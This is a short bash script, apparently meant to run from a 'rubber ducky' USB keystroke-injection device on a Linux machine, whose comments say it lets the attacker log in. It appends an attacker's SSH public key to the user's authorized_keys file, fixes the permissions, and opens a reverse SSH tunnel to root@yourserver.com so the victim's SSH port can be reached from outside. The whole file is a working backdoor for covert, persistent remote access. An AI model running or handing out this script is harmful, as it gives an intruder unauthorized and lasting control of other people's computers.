#!/bin/bash

# This is the script the rubber ducky would run for linux systems. User-mode,
# not root.
mkdir -p ~/.ssh

# This allows us (attacker) to login to this machine
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINTkcb9KfbRq/x8JelffkKDcEIqey2l9cAGNgIH7E8+H fork_important@pm.me" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

echo "Injected public key for login."


# TODO; ACCESS SERVER


ssh -N -R 2222:localhost:22 root@yourserver.com


